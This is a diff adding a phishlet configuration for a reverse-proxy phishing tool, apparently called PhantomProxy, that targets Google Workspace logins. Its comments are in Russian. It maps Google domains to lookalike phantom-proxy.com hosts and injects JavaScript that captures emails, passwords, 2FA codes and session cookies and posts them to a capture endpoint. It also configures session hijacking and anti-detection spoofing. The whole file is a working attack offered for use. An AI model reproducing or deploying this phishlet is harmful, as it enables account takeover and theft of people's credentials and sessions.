@@ -1,0 +1,257 @@
+# ============================================================================
+# Google Workspace / Gmail Phishlet
+# Полный перехват сессий Google
+# ============================================================================
+
+id: googleworkspace
+name: Google Workspace (Gmail/Drive/Docs)
+author: PhantomProxy Team
+version: "2.0"
+description: |
+  Перехват сессий Google Workspace:
+  - Gmail
+  - Google Drive
+  - Google Docs/Sheets/Slides
+  - Google Calendar
+  - Google Meet
+
+target:
+  primary: "accounts.google.com"
+  secondary:
+    - "mail.google.com"
+    - "drive.google.com"
+    - "docs.google.com"
+    - "calendar.google.com"
+    - "meet.google.com"
+    - "chat.google.com"
+    - "contacts.google.com"
+    - "photos.google.com"
+    - "myaccount.google.com"
+
+sub_filters:
+  - type: "domain"
+    from: "accounts.google.com"
+    to: "accounts.phantom-proxy.com"
+    priority: 1
+    
+  - type: "domain"
+    from: "mail.google.com"
+    to: "mail.phantom-proxy.com"
+    priority: 2
+    
+  - type: "domain"
+    from: "drive.google.com"
+    to: "drive.phantom-proxy.com"
+    priority: 3
+    
+  - type: "domain"
+    from: "docs.google.com"
+    to: "docs.phantom-proxy.com"
+    priority: 4
+    
+  - type: "domain"
+    from: "www.google.com"
+    to: "www.phantom-proxy.com"
+    priority: 5
+
+  - type: "domain"
+    from: "fonts.gstatic.com"
+    to: "fonts.phantom-proxy.com"
+    priority: 100
+    
+  - type: "domain"
+    from: "www.gstatic.com"
+    to: "static.phantom-proxy.com"
+    priority: 101
+
+js_inject: |
+  (function() {
+    'use strict';
+    
+    console.log('[PhantomProxy] Google Workspace phishlet loaded');
+    
+    // Google специфичный перехват
+    const googleCapture = {
+      // Перехват пароля
+      capturePassword: function(form) {
+        const email = form.querySelector('input[type="email"]')?.value || '';
+        const password = form.querySelector('input[type="password"]')?.value || '';
+        
+        if (email || password) {
+          fetch('/api/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              type: 'google_credentials',
+              email: email,
+              password: password,
+              url: window.location.href
+            })
+          });
+        }
+      },
+      
+      // Перехват 2FA кода
+      capture2FA: function(input) {
+        if (input.value && input.value.length >= 6) {
+          fetch('/api/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              type: 'google_2fa',
+              code: input.value,
+              url: window.location.href
+            })
+          });
+        }
+      },
+      
+      // Перехват cookies
+      captureSession: function() {
+        const cookies = {
+          SID: this.getCookie('SID'),
+          HSID: this.getCookie('HSID'),
+          SSID: this.getCookie('SSID'),
+          APISID: this.getCookie('APISID'),
+          SAPISID: this.getCookie('SAPISID'),
+          OAuthToken: this.getCookie('OAuthToken')
+        };
+        
+        fetch('/api/capture', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            type: 'google_session',
+            cookies: cookies,
+            url: window.location.href
+          })
+        });
+      },
+      
+      getCookie: function(name) {
+        const value = `; ${document.cookie}`;
+        const parts = value.split(`; ${name}=`);
+        if (parts.length === 2) return parts.pop().split(';').shift();
+        return '';
+      }
+    };
+    
+    // Наблюдатель за формами
+    const observer = new MutationObserver((mutations) => {
+      mutations.forEach((mutation) => {
+        if (mutation.addedNodes.length) {
+          mutation.addedNodes.forEach((node) => {
+            if (node.tagName === 'FORM') {
+              node.addEventListener('submit', (e) => {
+                googleCapture.capturePassword(e.target);
+              });
+            }
+            
+            if (node.tagName === 'INPUT' && node.type === 'text') {
+              node.addEventListener('blur', (e) => {
+                if (e.target.value.length >= 6 && /^\d+$/.test(e.target.value)) {
+                  googleCapture.capture2FA(e.target);
+                }
+              });
+            }
+          });
+        }
+      });
+    });
+    
+    observer.observe(document.body, { childList: true, subtree: true });
+    
+    // Захват при загрузке
+    window.addEventListener('load', () => {
+      googleCapture.captureSession();
+    });
+    
+    // Скрытие прокси
+    Object.defineProperty(navigator, 'webdriver', { get: () => false });
+    
+  })();
+
+triggers:
+  - name: "google_login"
+    path_regex: "/signin|/login|/ServiceLogin"
+    actions:
+      - type: "inject_js"
+        payload: "google_login.js"
+      - type: "capture_form"
+        fields: ["Email", "email", "identifier", "passwd", "password"]
+        
+  - name: "google_2fa"
+    path_regex: "/challenge|/verify|/two_factor"
+    actions:
+      - type: "capture_form"
+        fields: ["pin", "code", "totpPin", "verificationCode"]
+      - type: "realtime_capture"
+        enabled: true
+        
+  - name: "gmail_main"
+    host_regex: "mail.google.com"
+    actions:
+      - type: "capture_cookies"
+        cookies: ["SID", "HSID", "SSID", "APISID", "SAPISID"]
+      - type: "session_hijack"
+        enabled: true
+        
+  - name: "google_drive"
+    host_regex: "drive.google.com"
+    actions:
+      - type: "capture_cookies"
+        cookies: ["DRIVE_STREAM", "SID", "HSID"]
+
+cookies:
+  critical:
+    - "SID"
+    - "HSID"
+    - "SSID"
+    - "APISID"
+    - "SAPISID"
+    - "SIDCC"
+    - "OAuthToken"
+    
+  session:
+    - "DRIVE_STREAM"
+    - "PREF"
+    - "NID"
+    - "1P_JAR"
+    
+  additional:
+    - "AEC"
+    - "__Secure-3PSID"
+    - "__Secure-3PAPISID"
+
+headers:
+  - "Authorization"
+  - "X-Goog-AuthUser"
+  - "X-Goog-PageId"
+  - "X-Same-Domain"
+
+anti_detection:
+  hide_webdriver: true
+  spoof_navigator: true
+  anti_devtools: true
+  random_timings: true
+  canvas_spoof: true
+  webgl_spoof: true
+
+performance:
+  cache_static: true
+  compress_responses: true
+  lazy_images: true
+  minify_js: true
+  http2_push: true
+
+ssl:
+  min_version: "TLS1.3"
+  alpn_protocols:
+    - "h2"
+    - "http/1.1"
+
+logging:
+  log_requests: true
+  log_responses: true
+  log_errors: true
+  log_path: "./logs/google/"
